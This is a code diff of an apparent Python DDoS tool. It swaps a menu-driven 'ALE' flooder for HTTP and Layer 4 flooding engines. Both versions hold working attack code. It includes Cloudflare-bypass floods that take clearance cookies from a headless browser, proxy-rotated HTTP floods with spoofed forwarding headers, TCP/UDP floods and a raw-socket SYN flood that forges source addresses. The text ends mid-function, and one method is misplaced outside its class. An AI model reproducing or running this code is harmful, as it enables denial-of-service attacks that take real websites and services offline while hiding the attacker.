-    def __init__(self, target_url: str, threads: int, duration: int):
-        super().__init__(target_url, threads, duration)
-        self.request = self._build_cf_request()
-    
-    def _build_cf_request(self) -> str:
-        ua = State.cf_user_agent or "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8"
-        cookie = f"{State.cf_cookie_name}={State.cf_cookie_value}" if State.cf_cookie_name else ""
-        
-        req = f'GET {self.target["uri"]} HTTP/1.1\r\n'
-        req += f'Host: {self.target["host"]}\r\n'
-        req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n'
-        req += 'Accept-Encoding: gzip, deflate, br\r\n'
-        req += 'Accept-Language: en-US,en;q=0.9\r\n'
-        req += 'Cache-Control: max-age=0\r\n'
-        if cookie:
-            req += f'Cookie: {cookie}\r\n'
-        req += 'sec-ch-ua: "Chromium";v="120", "Google Chrome";v="120"\r\n'
-        req += 'sec-ch-ua-mobile: ?0\r\n'
-        req += 'sec-ch-ua-platform: "Windows"\r\n'
-        req += 'Connection: Keep-Alive\r\n'
-        req += f'User-Agent: {ua}\r\n\r\n\r\n'
-        return req
-    
-    def worker(self) -> None:
-        s = None
-        while not self.timer.expired:
-            if s is None:
-                s = Utils.create_socket(self.target)
-                if s is None:
-                    time.sleep(0.1)
-                    continue
-            try:
-                for _ in range(10):
-                    s.send(self.request.encode())
-            except:
-                try:
-                    s.close()
-                except:
-                    pass
-                s = None
-
-
-class HTTP2Attack(AttackBase):
-    """HTTP/2 request attack."""
-    name = "HTTP/2"
-    requires_modules = ['httpx']
-    
-    def worker(self) -> None:
-        headers = Utils.get_standard_headers()
-        try:
-            client = httpx.Client(http2=True, timeout=Config.REQUEST_TIMEOUT)
-        except:
-            return
-        
-        while not self.timer.expired:
-            try:
-                client.get(self.target_url, headers=headers)
-            except:
-                pass
-
-
-class ProxyHTTP2Attack(AttackBase):
-    """HTTP/2 attack through proxies."""
-    name = "Proxy HTTP/2"
-    requires_modules = ['httpx']
-    
-    def worker(self) -> None:
-        headers = Utils.get_standard_headers()
-        
-        while not self.timer.expired and State.proxies:
-            try:
-                proxy = f"http://{random.choice(State.proxies)}"
-                client = httpx.Client(
-                    http2=True,
-                    proxies={'http://': proxy, 'https://': proxy},
-                    timeout=Config.REQUEST_TIMEOUT
-                )
-                client.get(self.target_url, headers=headers)
-            except:
-                pass
-class SkyAttack(AttackBase):
-    """Sky method - bypass Google Project Shield, vShield, DDoS Guard Free, CF NoSec with proxy."""
-    name = "Sky"
-    requires_modules = ['socks']
-    
-    def worker(self) -> None:
-        if not State.proxies:
-            return
-        
-        ua = random.choice(State.user_agents) if State.user_agents else "Mozilla/5.0"
-        req = (
-            f"GET / HTTP/1.1\r\n"
-            f"Host: {self.target['host']}\r\n"
-            "Cache-Control: no-cache\r\n"
-            f"User-Agent: {ua}\r\n"
-            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
-            "Sec-Fetch-Site: same-origin\r\n"
-            "Sec-GPC: 1\r\n"
-            "Sec-Fetch-Mode: navigate\r\n"
-            "Sec-Fetch-Dest: document\r\n"
-            "Upgrade-Insecure-Requests: 1\r\n"
-            "Connection: Keep-Alive\r\n\r\n"
-        )
-        
-        while not self.timer.expired:
-            try:
-                proxy = random.choice(State.proxies).strip().split(":")
-                s = socks.socksocket()
-                s.settimeout(Config.SOCKET_TIMEOUT)
-                s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
-                s.connect((self.target['host'], int(self.target['port'])))
-                ctx = ssl.SSLContext()
-                s = ctx.wrap_socket(s, server_hostname=self.target['host'])
-                
-                try:
-                    for _ in range(Config.SEND_LOOPS):
-                        s.send(req.encode())
-                except:
-                    pass
-                finally:
-                    try:
-                        s.close()
-                    except:
-                        pass
-            except:
-                pass
-
-
-class StellarAttack(AttackBase):
-    """Stellar method - HTTPS flood without proxies."""
-    name = "Stellar"
-    
-    def worker(self) -> None:
-        ua = random.choice(State.user_agents) if State.user_agents else "Mozilla/5.0"
-        req = (
-            f"GET / HTTP/1.1\r\n"
-            f"Host: {self.target['host']}\r\n"
-            "Cache-Control: no-cache\r\n"
-            f"User-Agent: {ua}\r\n"
-            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
-            "Sec-Fetch-Site: same-origin\r\n"
-            "Sec-GPC: 1\r\n"
-            "Sec-Fetch-Mode: navigate\r\n"
-            "Sec-Fetch-Dest: document\r\n"
-            "Upgrade-Insecure-Requests: 1\r\n"
-            "Connection: Keep-Alive\r\n\r\n"
-        )
-        
-        while not self.timer.expired:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(Config.SOCKET_TIMEOUT)
-                s.connect((self.target['host'], int(self.target['port'])))
-                ctx = ssl.create_default_context()
-                s = ctx.wrap_socket(s, server_hostname=self.target['host'])
-                
-                try:
-                    for _ in range(Config.SEND_LOOPS):
-                        s.send(req.encode())
-                except:
-                    pass
-                finally:
-                    try:
-                        s.close()
-                    except:
-                        pass
-            except:
-                pass
-###############################################################################
-
-def bypass_cloudflare(url: str) -> bool:
-    """
-    Cloudflare Bypass
-    """
-    if not Utils.check_module('undetected_chromedriver'):
-        return False
-    
-    print(f" [*] Bypassing Cloudflare... (Max {Config.CF_BYPASS_MAX_WAIT}s)")
-    
-    options = webdriver.ChromeOptions()
-    arguments = [
-        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars',
-        '--disable-logging', '--disable-login-animations', '--disable-notifications',
-        '--disable-gpu', '--headless', '--lang=en_US',
+    # Layer 7 (HTTP/HTTPS Flood) Methods
+    LAYER7_METHODS = [
+        "bypass", "cf-bypass", "http-get", "http-post", "http-head",
+        "http-options", "http-trace", "http-put", "http-delete",
+        "http-patch", "http-get-flood", "http-post-flood",
+        "slow-read", "slow-send", "slowloris", "ping-of-death",
+        "r00t", "torrent", "dgb", "ev-post", "http2-flood",
+        "cf-socket", "http-socket", "tls-socket", "browser",
+        "request", "http-flood", "cf-bypass2", "premium",
+        "strike", "storm", "bomb", "http-spoof",
+        "http-raw", "cf-bypass3"
     ]
-    for arg in arguments:
-        options.add_argument(arg)
-    
-    try:
-        driver = webdriver.Chrome(options=options)
-        driver.implicitly_wait(3)
-        driver.get(url)
-        
-        for _ in range(Config.CF_BYPASS_MAX_WAIT):
-            cookies = driver.get_cookies()
-            for c in cookies:
-                if c.get('name') == 'cf_clearance':
-                    State.cf_cookie_name = c['name']
-                    State.cf_cookie_value = c['value']
-                    State.cf_user_agent = driver.execute_script("return navigator.userAgent")
-                    driver.quit()
-                    print(f" [+] CF bypass successful!")
-                    return True
-            time.sleep(1)
-        
-        driver.quit()
-        print(f" [-] CF bypass failed after {Config.CF_BYPASS_MAX_WAIT}s")
-        return False
-    except Exception as e:
-        print(f" [!] CF bypass error: {e}")
-        return False
-######################################################################################################
-class CLI:
-    """Interactive command-line interface."""
-    
+
+    # Layer 4 (TCP/UDP) Methods
+    LAYER4_METHODS = [
+        "tcp-flood", "udp-flood", "syn-flood", "ack-flood",
+        "syn-ack-flood", "fin-flood", "rst-flood", "xmas-flood",
+        "icmp-echo", "icmp-flood", "dns-flood", "ntp-flood",
+        "sntp-flood", "ssdp-flood", "chargen-flood",
+        "memcache-flood", "ldap-flood", "portmap-flood",
+        "arduino-flood", "siege", "quake-flood",
+        "mssql-flood", "minecraft-flood", "ts3-flood"
+    ]
+    LAYER4_AMP = [m for m in LAYER4_METHODS if "flood" in m]
+
+    ALL_METHODS = LAYER7_METHODS + LAYER4_METHODS
+
     @staticmethod
-    def display_title() -> None:
-        """Display the ALE banner."""
-        print()
-        print(f"{'':>33}╔═╗╦  ╔═╗")
-        print(f"{'':>33}╠═╣║  ║╣ ")
-        print(f"{'':>33}╩ ╩╩═╝╚═╝")
-        print(f"{'':>12}{'═' * 46}")
-        print(f"{'':>12}║        FUCK THE SHIT        {'':>10}║")
-        print(f"{'':>12}║  Type [help] to see commands{'':>16}║")
-        print(f"{'':>12}╚{'═' * 46}╝")
-        print()
-    
+    def is_layer7(method: str) -> bool:
+        return method.lower() in Methods.LAYER7_METHODS
+
     @staticmethod
-    def display_help() -> None:
-        """Display help menu."""
-        print(f"{'':>33}╦ ╦╔═╗╦  ╔═╗")
-        print(f"{'':>33}╠═╣║╣ ║  ╠═╝")
-        print(f"{'':>33}╩ ╩╚═╝╩═╝╩")
-        print(f"{'':>12}{'═' * 46}")
-        print(f"{'':>12}║ • layer7   | Show Layer7 Methods{'':>12}║")
-        print(f"{'':>12}║ • layer4   | Show Layer4 Methods{'':>12}║")
-        print(f"{'':>12}║ • tools    | Show tools{'':>20}║")
-        print(f"{'':>12}║ • credit   | Show credits{'':>19}║")
-        print(f"{'':>12}║ • exit     | Exit ALE{'':>22}║")
-        print(f"{'':>12}╚{'═' * 46}╝")
-        print()
-    
-    @staticmethod
-    def display_layer7() -> None:
-        """Display L7 methods."""
-        methods = [
-            ("cfb", "Bypass CF Attack"),
-            ("pxcfb", "Bypass CF Attack With Proxy"),
-            ("cfreq", "Bypass CF UAM, CAPTCHA, BFM (request)"),
-            ("cfsoc", "Bypass CF UAM, CAPTCHA, BFM (socket)"),
-            ("pxsky", "Bypass Google Project Shield, vShield, DDoS Guard Free, CF NoSec (proxy)"),
-            ("sky", "Sky method without proxy"),
-            ("http2", "HTTP 2.0 Request Attack"),
-            ("pxhttp2", "HTTP 2.0 Request Attack With Proxy"),
-            ("get", "GET Request Attack"),
-            ("post", "POST Request Attack"),
-            ("head", "HEAD Request Attack"),
-            ("pps", "Only GET / HTTP/1.1"),
-            ("spoof", "HTTP Spoof Socket Attack"),
-            ("pxspoof", "HTTP Spoof Socket Attack With Proxy"),
-            ("soc", "Socket Attack"),
-            ("pxraw", "Proxy Request Attack"),
-            ("pxsoc", "Proxy Socket Attack"),
-        ]
-        
-        print(f"{'':>33}╦  ╔═╗╦ ╦╔═╗╦═╗")
-        print(f"{'':>33}║  ╠═╣╚╦╝║╣ ╠╦╝")
-        print(f"{'':>33}╩═╝╩ ╩ ╩ ╚═╝╩╚═")
-        print(f"{'':>12}{'═' * 56}")
-        for name, desc in methods:
-            print(f"{'':>12}║ • {name:<8}| {desc:<43}║")
-        print(f"{'':>12}╚{'═' * 56}╝")
-        print()
-    
-    @staticmethod
-    def display_layer4() -> None:
-        """Display L4 methods."""
-        print(f"{'':>33}╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦")
-        print(f"{'':>33}║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣")
-        print(f"{'':>33}╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩")
-        print(f"{'':>12}{'═' * 46}")
-        print(f"{'':>12}║ • udp      | UDP Flood{'':>21}║")
-        print(f"{'':>12}║ • tcp      | TCP Flood{'':>21}║")
-        print(f"{'':>12}╚{'═' * 46}╝")
-        print()
-    
-    @staticmethod
-    def display_tools() -> None:
-        """Display tools menu."""
-        print(f"{'':>33}╔╦╗╔═╗╔═╗╦  ╔═╗")
-        print(f"{'':>33} ║ ║ ║║ ║║  ╚═╗")
-        print(f"{'':>33} ╩ ╚═╝╚═╝╩═╝╚═╝")
-        print(f"{'':>12}{'═' * 46}")
-        print(f"{'':>12}║ • geoip    | Geo IP Address Lookup{'':>10}║")
-        print(f"{'':>12}║ • dns      | Classic DNS Lookup{'':>14}║")
-        print(f"{'':>12}║ • subnet   | Subnet IP Lookup{'':>17}║")
-        print(f"{'':>12}╚{'═' * 46}╝")
-        print()
-    
-    @staticmethod
-    def display_credit() -> None:
-        """Display credits."""
-        print(f"{'═' * 28}╗")
-        print(f"• MODIFIED BY: ALE")
-        print(f"{'═' * 28}╝")
-        print()
-    
-    @staticmethod
-    def get_l7_input() -> Tuple[str, str, str]:
-        """Get L7 attack parameters from user."""
-        target = input(f" • URL      : ")
-        threads = input(f" • THREAD   : ")
-        duration = input(f" • TIME(s)  : ")
-        return target, threads, duration
-    
-    @staticmethod
-    def get_l4_input() -> Tuple[str, str, str, str]:
-        """Get L4 attack parameters from user."""
-        target = input(f" • IP       : ")
-        port = input(f" • PORT     : ")
-        threads = input(f" • THREAD   : ")
-        duration = input(f" • TIME(s)  : ")
-        return target, port, threads, duration
-    
-    @staticmethod
-    def run_tool_api(endpoint: str, label: str) -> None:
-        """Run a tool API query."""
-        if not Utils.check_module('requests'):
-            return
-        target = input(f" [>] {label}: ")
+    def is_layer4(method: str) -> bool:
+        return method.lower() in Methods.LAYER4_METHODS
+
+
+# ─── HTTP Flood Engine ──────────────────────────────────────────────────────
+
+class HttpFlood:
+    """Layer 7 HTTP/HTTPS flooding engine with proxy rotation."""
+
+    def __init__(self, target_url: str, threads: int, proxy_file: str,
+                 rpc: int, duration: int, method: str = "bypass"):
+        self.target_url = target_url
+        self.parsed_url = urllib.parse.urlparse(target_url)
+        self.host = self.parsed_url.hostname or ""
+        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == "https" else 80)
+        self.ssl = self.parsed_url.scheme == "https"
+        self.path = self.parsed_url.path or "/"
+        if self.parsed_url.query:
+            self.path += "?" + self.parsed_url.query
+        self.threads = threads
+        self.rpc = rpc
+        self.duration = duration
+        self.method = method.lower()
+        self.proxy_file = proxy_file
+        self.proxies: List[Proxy] = []
+        self.proxy_index = 0
+        self.proxy_lock = threading.Lock()
+        self.user_agents: List[str] = []
+        self.referers: List[str] = []
+        self.load_user_agents()
+        self.load_referers()
+        self.load_proxies()
+        self.running = True
+        self.start_time = 0
+        self.requests_sent = 0
+        self.bytes_sent = 0
+        self.errors = 0
+        self.stats_lock = threading.Lock()
+
+    def load_user_agents(self, filepath: str = "files/useragent.txt"):
+        """Load user agents from file."""
         try:
-            r = requests.get(f"https://api.hackertarget.com/{endpoint}/?q={target}", timeout=15)
-            print(r.text)
-        except Exception as e:
-            print(f" [!] API error: {e}")
-    
-    @staticmethod
-    def process_command(cmd: str) -> None:
-        """Process a single command."""
-        cmd = cmd.lower().strip()
-        
-        if cmd in ("cls", "clear"):
-            os.system('cls' if os.name == 'nt' else 'clear')
-            CLI.display_title()
-        elif cmd in ("help", "?"):
-            CLI.display_help()
-        elif cmd == "credit":
-            CLI.display_credit()
-        elif cmd in ("layer7", "l7"):
-            CLI.display_layer7()
-        elif cmd in ("layer4", "l4"):
-            CLI.display_layer4()
-        elif cmd in ("tools", "tool"):
-            CLI.display_tools()
-        elif cmd == "exit":
-            print(" [*] Exiting ALE. Goodbye!")
-            sys.exit(0)
-        elif cmd == "test":
-            target, threads, duration = CLI.get_l7_input()
-            SocketAttack(target, threads, duration).launch()
-        elif cmd == "http2":
-            target, threads, duration = CLI.get_l7_input()
-            HTTP2Attack(target, threads, duration).launch()
-        elif cmd == "pxhttp2":
-            if State.load_proxies():
-                target, threads, duration = CLI.get_l7_input()
-                ProxyHTTP2Attack(target, threads, duration).launch()
-        elif cmd == "cfb":
-            target, threads, duration = CLI.get_l7_input()
-            CloudflareBypassAttack(target, threads, duration).launch()
-        elif cmd == "pxcfb":
-            if State.load_proxies():
-                target, threads, duration = CLI.get_l7_input()
-                ProxyCloudflareBypassAttack(target, threads, duration).launch()
-        elif cmd == "pps":
-            target, threads, duration = CLI.get_l7_input()
-            PPSAttack(target, threads, duration).launch()
-        elif cmd == "spoof":
-            target, threads, duration = CLI.get_l7_input()
-            SpoofSocketAttack(target, threads, duration).launch()
-        elif cmd == "pxspoof":
-            target, threads, duration = CLI.get_l7_input()
-            SpoofProxySocketAttack(target, threads, duration).launch()
-        elif cmd == "get":
-            target, threads, duration = CLI.get_l7_input()
-            HTTPGetAttack(target, threads, duration).launch()
-        elif cmd == "post":
-            target, threads, duration = CLI.get_l7_input()
-            HTTPPostAttack(target, threads, duration).launch()
-        elif cmd == "head":
-            target, threads, duration = CLI.get_l7_input()
-            HTTPHeadAttack(target, threads, duration).launch()
-        elif cmd == "pxraw":
-            if State.load_proxies():
-                target, threads, duration = CLI.get_l7_input()
-                ProxyGetAttack(target, threads, duration).launch()
-        elif cmd == "soc":
-            target, threads, duration = CLI.get_l7_input()
-            SocketAttack(target, threads, duration).launch()
-        elif cmd == "pxsoc":
-            if State.load_proxies():
-                target, threads, duration = CLI.get_l7_input()
-                ProxySocketAttack(target, threads, duration).launch()
-        elif cmd == "cfreq":
-            target, threads, duration = CLI.get_l7_input()
-            if bypass_cloudflare(target):
-                CFProAttack(target, threads, duration).launch()
-        elif cmd == "cfsoc":
-            target, threads, duration = CLI.get_l7_input()
-            if bypass_cloudflare(target):
-                CFSocketAttack(target, threads, duration).launch()
-        elif cmd == "pxsky":
-            if State.load_proxies():
-                target, threads, duration = CLI.get_l7_input()
-                SkyAttack(target, threads, duration).launch()
-        elif cmd == "sky":
-            target, threads, duration = CLI.get_l7_input()
-            StellarAttack(target, threads, duration).launch()
-        elif cmd == "udp":
-            target, port, threads, duration = CLI.get_l4_input()
-            attack = UDPFlood(f"{target}:{port}", threads, duration)
-            attack.target['port'] = port
-            attack.launch()
-        elif cmd == "tcp":
-            target, port, threads, duration = CLI.get_l4_input()
-            attack = TCPFlood(f"{target}:{port}", threads, duration)
-            attack.target['port'] = port
-            attack.launch()
-        elif cmd == "subnet":
-            CLI.run_tool_api("subnetcalc", "IP")
-        elif cmd == "dns":
-            CLI.run_tool_api("reversedns", "IP/DOMAIN")
-        elif cmd == "geoip":
-            CLI.run_tool_api("geoip", "IP")
-        else:
-            print(f" [>] Unknown command. Type 'help' to see all commands.")
+            if os.path.exists(filepath):
+                with open(filepath, 'r') as f:
+                    self.user_agents = [line.strip() for line in f if line.strip()]
+        except Exception:
+            pass
+        if not self.user_agents:
+            self.user_agents = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            ]
+
+    def load_referers(self, filepath: str = "files/referers.txt"):
+        """Load referers from file."""
+        try:
+            if os.path.exists(filepath):
+                with open(filepath, 'r') as f:
+                    self.referers = [line.strip() for line in f if line.strip()]
+        except Exception:
+            pass
+        if not self.referers:
+            self.referers = ["https://www.google.com/"]
+
+    def load_proxies(self):
+        """Load proxies from proxy file."""
+        if os.path.exists(self.proxy_file):
+            with open(self.proxy_file, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line and ':' in line:
+                        parts = line.split(':')
+                        if len(parts) >= 2:
+                            try:
+                                proxy = Proxy(
+                                    ip=parts[0],
+                                    port=int(parts[1]),
+                                    proxy_type=ProxyType.SOCKS5
+                                )
+                                self.proxies.append(proxy)
+                            except (ValueError, IndexError):
+                                pass
+        if not self.proxies:
+            print_warn("No proxies loaded! Continuing without proxies.")
+            self.proxies.append(Proxy(ip="127.0.0.1", port=9050, proxy_type=ProxyType.SOCKS5))
+
+        random.shuffle(self.proxies)
+        print_status(f"Loaded {len(self.proxies)} proxies for attack")
+
+    def get_next_proxy(self) -> Optional[Proxy]:
+        """Get next proxy in round-robin fashion."""
+        with self.proxy_lock:
+            if not self.proxies:
+                return None
+            proxy = self.proxies[self.proxy_index % len(self.proxies)]
+            self.proxy_index += 1
+            return proxy
+
+    def get_random_headers(self) -> dict:
+        """Generate random HTTP headers."""
+        headers = {
+            'User-Agent': random.choice(self.user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr,fr-FR;q=0.9', 'de,de-DE;q=0.9']),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': random.choice(['keep-alive', 'close']),
+            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
+        }
+        if self.referers:
+            headers['Referer'] = random.choice(self.referers)
+        if random.random() < 0.3:
+            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
+        if random.random() < 0.2:
+            headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
+        return headers
+
+    def build_request(self) -> bytes:
+        """Build a raw HTTP request."""
+        headers = self.get_random_headers()
+        method_str = self.method.upper().replace('-', '_').replace('HTTP_', '') if self.method.startswith('http-') else 'GET'
+
+        req = f"{method_str} {self.path} HTTP/1.1\r\n"
+        req += f"Host: {self.host}\r\n"
+        for k, v in headers.items():
+            req += f"{k}: {v}\r\n"
+        req += "\r\n"
+
+        return req.encode()
+
+    def worker_requests(self, worker_id: int):
+        """Worker thread using requests library with proxy."""
+        if requests is None:
+            return
+
+        while self.running and (time.time() - self.start_time) < self.duration:
+            sent_in_cycle = 0
+            for _ in range(self.rpc):
+                if not self.running or (time.time() - self.start_time) >= self.duration:
+                    break
+                try:
+                    proxy = self.get_next_proxy()
+                    if proxy is None:
+                        continue
+
+                    proxy_url = proxy.to_url()
+                    proxies_dict = {
+                        'http': proxy_url,
+                        'https': proxy_url.replace('http://', 'https://')
+                    }
+
+                    headers = self.get_random_headers()
+                    resp = requests.get(
+                        self.target_url,
+                        proxies=proxies_dict,
+                        headers=headers,
+                        timeout=5,
+                        verify=False
+                    )
+                    with self.stats_lock:
+                        self.requests_sent += 1
+                        self.bytes_sent += len(resp.content)
+                    sent_in_cycle += 1
+                except Exception:
+                    with self.stats_lock:
+                        self.errors += 1
+
+            if sent_in_cycle < self.rpc and self.running:
+                time.sleep(0.1)
+
+    def worker_raw_socket(self, worker_id: int):
+        """Worker thread using raw sockets with proxy."""
+        while self.running and (time.time() - self.start_time) < self.duration:
+            sent_in_cycle = 0
+            for _ in range(self.rpc):
+                if not self.running or (time.time() - self.start_time) >= self.duration:
+                    break
+                try:
+                    proxy = self.get_next_proxy()
+                    if proxy is None:
+                        continue
+
+                    request_data = self.build_request()
+
+                    if sockslib and proxy.proxy_type in [ProxyType.SOCKS4, ProxyType.SOCKS5]:
+                        sock = sockslib.socksocket()
+                        sock.set_proxy(
+                            sockslib.SOCKS5 if proxy.proxy_type == ProxyType.SOCKS5 else sockslib.SOCKS4,
+                            proxy.ip,
+                            proxy.port
+                        )
+                        sock.settimeout(5)
+                        sock.connect((self.host, self.port))
+                    else:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(5)
+                        sock.connect((self.host, self.port))
+
+                    if self.ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        sock = context.wrap_socket(sock, server_hostname=self.host)
+
+                    sock.sendall(request_data)
+                    try:
+                        response = sock.recv(4096)
+                        with self.stats_lock:
+                            self.requests_sent += 1
+                            self.bytes_sent += len(response)
+                    except socket.timeout:
+                        with self.stats_lock:
+                            self.requests_sent += 1  
+                    sock.close()
+                    sent_in_cycle += 1
+                except Exception:
+                    with self.stats_lock:
+                        self.errors += 1
+                    try:
+                        sock.close()
+                    except Exception:
+                        pass
+
+            if sent_in_cycle == 0 and self.running:
+                time.sleep(0.5)
+            elif sent_in_cycle < self.rpc and self.running:
+                time.sleep(0.05)
+
+    def start(self) -> Dict[str, Any]:
+        """Start the HTTP flood attack."""
+        self.start_time = time.time()
+        raw_methods = ["bypass", "cf-bypass", "http-socket", "cf-socket",
+                       "tls-socket", "http-raw", "slow-read", "slow-send",
+                       "slowloris", "browser", "strike", "storm", "bomb",
+                       "http-spoof", "cf-bypass3"]
+        use_raw = self.method in raw_methods
+
+        worker_target = self.worker_raw_socket if use_raw else self.worker_requests
+
+        print_info(f"Starting {self.method} attack on {self.target_url}")
+        print_info(f"Threads: {self.threads}, RPC: {self.rpc}, Duration: {self.duration}s")
+        print_info(f"Workers: {'Raw Socket' if use_raw else 'Requests Library'}")
+
+        threads = []
+        for i in range(self.threads):
+            t = threading.Thread(target=worker_target, args=(i,), daemon=True)
+            t.start()
+            threads.append(t)
+        try:
+            while self.running and (time.time() - self.start_time) < self.duration:
+                elapsed = int(time.time() - self.start_time)
+                remaining = max(0, self.duration - elapsed)
+                with self.stats_lock:
+                    rps = self.requests_sent / max(1, elapsed)
+                    bps = self.bytes_sent / max(1, elapsed)
+
+                stats = (
+                    f"[{elapsed}s/{self.duration}s] "
+                    f"Requests: {self.requests_sent} | "
+                    f"RPS: {rps:.1f} | "
+                    f"Bandwidth: {bps/1024:.1f} KB/s | "
+                    f"Errors: {self.errors} | "
+                    f"Remaining: {remaining}s"
+                )
+                print_status(stats)
+                time.sleep(2)
+        except KeyboardInterrupt:
+            self.running = False
+            print_warn("\nInterrupted by user")
+
+        self.running = False
+        for t in threads:
+            t.join(timeout=1)
+
+        elapsed = time.time() - self.start_time
+        return {
+            "method": self.method,
+            "target": self.target_url,
+            "duration": elapsed,
+            "requests_sent": self.requests_sent,
+            "bytes_sent": self.bytes_sent,
+            "errors": self.errors,
+            "avg_rps": self.requests_sent / max(1, elapsed),
+            "avg_bps": self.bytes_sent / max(1, elapsed),
+        }
 
 
-###############################################################################################
-def main() -> None:
-    """Main entry point."""
-    colorama_init(convert=True) if colorama_mod else None
-    State.load_user_agents()
-    Config.RESOURCES_DIR.mkdir(parents=True, exist_ok=True)
-    if _MISSING_MODULES:
-        print(f" [i] Some optional modules are missing:")
-        for mod in sorted(_MISSING_MODULES):
-            print(f"     - {mod} (install: pip3 install {mod})")
-        print(f" [i] Socket-based methods will still work without these.")
-        print()
-    if len(sys.argv) < 2:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        CLI.display_title()
-        while True:
+# ─── Layer 4 Engine ──────────────────────────────────────────────────────────
+
+class Layer4:
+    """Layer 4 TCP/UDP flooding engine."""
+
+    def __init__(self, target_ip: str, target_port: int, threads: int,
+                 duration: int, method: str = "tcp-flood", proxy_file: str = ""):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.threads = threads
+        self.duration = duration
+        self.method = method.lower()
+        self.proxy_file = proxy_file
+        try:
+            ipaddress.ip_address(target_ip)
+        except ValueError:
+            resolved = self.resolve_hostname(target_ip)
+            if resolved:
+                self.target_ip = resolved
+                print_info(f"Resolved {target_ip} -> {self.target_ip}")
+            else:
+                raise ValueError(f"Could not resolve {target_ip}")
+
+        self.running = True
+        self.start_time = 0
+        self.packets_sent = 0
+        self.bytes_sent = 0
+        self.errors = 0
+        self.stats_lock = threading.Lock()
+
+    def resolve_hostname(self, hostname: str) -> Optional[str]:
+        """Resolve hostname to IP address."""
+        try:
+            return socket.gethostbyname(hostname)
+        except socket.gaierror:
+            return None
+
+    def worker_tcp(self, worker_id: int):
+        """TCP connection flood worker."""
+        while self.running and (time.time() - self.start_time) < self.duration:
             try:
-                cmd = input(f"╔═══[root@ALE]\n╚══> ")
-                CLI.process_command(cmd)
-            except KeyboardInterrupt:
-                print(f"\n [*] Interrupted. Exiting...")
-                sys.exit(0)
-            except Exception as e:
-                print(f" [!] Error: {e}")
-                import traceback
-                traceback.print_exc()
-    elif len(sys.argv) == 5:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                sock.connect((self.target_ip, self.target_port))
+                data = os.urandom(random.randint(64, 1024))
+                sock.sendall(data)
+                with self.stats_lock:
+                    self.packets_sent += 1
+                    self.bytes_sent += len(data)
+                sock.close()
+            except Exception:
+                with self.stats_lock:
+                    self.errors += 1
+                try:
+                    sock.close()
+                except Exception:
+                    pass
+
+    def worker_udp(self, worker_id: int):
+        """UDP flood worker."""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while self.running and (time.time() - self.start_time) < self.duration:
+            try:
+                data = os.urandom(random.randint(64, 1400))
+                sock.sendto(data, (self.target_ip, self.target_port))
+                with self.stats_lock:
+                    self.packets_sent += 1
+                    self.bytes_sent += len(data)
+            except Exception:
+                with self.stats_lock:
+                    self.errors += 1
+
+    def worker_syn(self, worker_id: int):
+        """SYN flood using raw sockets (requires root)."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        except PermissionError:
+            print_warn("SYN flood requires root privileges, falling back to TCP")
+            self.worker_tcp(worker_id)
+            return
+
+        while self.running and (time.time() - self.start_time) < self.duration:
+            try:
+                src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
+                src_port = random.randint(1024, 65535)
+                seq_num = random.randint(0, 2**32 - 1)
+                tcp_header = struct.pack('!HHIIBBHHH',
+                    src_port,
+                    self.target_port,
+                    seq_num,
+                    0,
+                    5 << 4,
+                    0x02,  
+                    65535,  
+                    0,
+                    0
+                )
+
+                # Pseudo header for checksum
+                pseudo = struct.pack('!4s4sBBH',
+                    socket.inet_aton(src_ip),
+                    socket.inet_aton(self.target_ip),
+                    0,
+                    socket.IPPROTO_TCP,
+                    len(tcp_header)
+                )
+                checksum = self._checksum(pseudo + tcp_header)
+
+                tcp_header = struct.pack('!HHIIBBHHH',
+                    src_port,
+                    self.target_port,
+                    seq_num,
+                    0,
+                    5 << 4,
+                    0x02,
+                    65535,
+                    checksum,
+                    0
+                )
+
+              
+                ip_header = struct.pack('!BBHHHBBH4s4s',
+                    0x45,  
+                    0,     
+                    40,    
+                    random.randint(0, 65535), 
+                    0,    
+                    64,    
+                    socket.IPPROTO_TCP,
+                    0,     
+                    socket.inet_aton(src_ip),
+                    socket.inet_aton(self.target_ip)
+                )
+
+                packet = ip_header + tcp_header
+                sock.sendto(packet, (self.target_ip, 0))
+
+                with self.stats_lock:
+                    self.packets_sent += 1
+                    self.bytes_sent += len(packet)
+            except Exception:
+                with self.stats_lock:
+                    self.errors += 1
+
+def _checksum(self, data: bytes) -> int:
+        """Calculate TCP/IP checksum."""
+        if len(data) % 2 != 0:
